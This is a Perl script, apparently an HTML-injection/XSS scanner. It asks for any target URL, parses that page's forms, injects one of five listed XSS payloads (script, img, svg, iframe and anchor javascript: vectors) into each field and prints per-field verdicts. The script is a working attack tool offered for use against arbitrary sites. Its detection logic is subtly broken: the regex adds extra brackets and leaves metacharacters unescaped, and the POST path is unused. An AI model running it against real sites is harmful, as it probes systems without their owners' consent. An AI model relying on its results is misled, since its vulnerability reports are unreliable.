#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTML::Form;
use HTTP::Cookies;

# Function to send HTTP request and check for vulnerability
sub test_injection {
    my ($url, $method, $params, $cookies) = @_;
    my $ua = LWP::UserAgent->new;
    $ua->cookie_jar(HTTP::Cookies->new(file => "cookies.txt", autosave => 1));
    my $response;

    if ($method eq 'GET') {
        my $get_url = URI->new($url);
        $get_url->query_form(%$params);
        $response = $ua->get($get_url);
    } elsif ($method eq 'POST') {
        $ua->default_headers->header('Content-Type' => 'application/x-www-form-urlencoded');
        $response = $ua->post($url, $params);
    }

    if ($response->is_success) {
        my $content = $response->decoded_content;
        foreach my $param (keys %$params) {
            if ($content =~ /<\s*$params->{$param}\s*>/i) {
                print "Vulnerable to HTML Injection in $param with payload: $params->{$param}\n";
            } else {
                print "Not vulnerable to HTML Injection in $param\n";
            }
        }
    } else {
        print "Error: " . $response->status_line . "\n";
    }
}

# Function to parse HTML forms and extract input fields
sub extract_input_fields {
    my ($content) = @_;
    my @forms = HTML::Form->parse($content, $ENV{'HTTP_REFERER'});
    my %input_fields;
    foreach my $form (@forms) {
        foreach my $input ($form->inputs) {
            $input_fields{$input->name} = '';  # Initialize with empty payload
        }
    }
    return \%input_fields;
}

# Main code
print "Enter your target website url: ";
my $url = <STDIN>;
chomp($url);

my $ua = LWP::UserAgent->new;
my $response = $ua->get($url);
die "Error: " . $response->status_line unless $response->is_success;
my $content = $response->decoded_content;

my $input_fields = extract_input_fields($content);

# Define payloads
my @payloads = (
    "<script>alert('XSS');</script>",
    "<img src=\"javascript:alert('XSS')\">",
    "<svg/onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>"
);

# Generate random payloads for each input field
my %params;
foreach my $param (keys %$input_fields) {
    my $payload = $payloads[rand @payloads];
    $params{$param} = $payload;
}

# Call the function with the URL, method, and parameters
test_injection($url, 'GET', \%params);
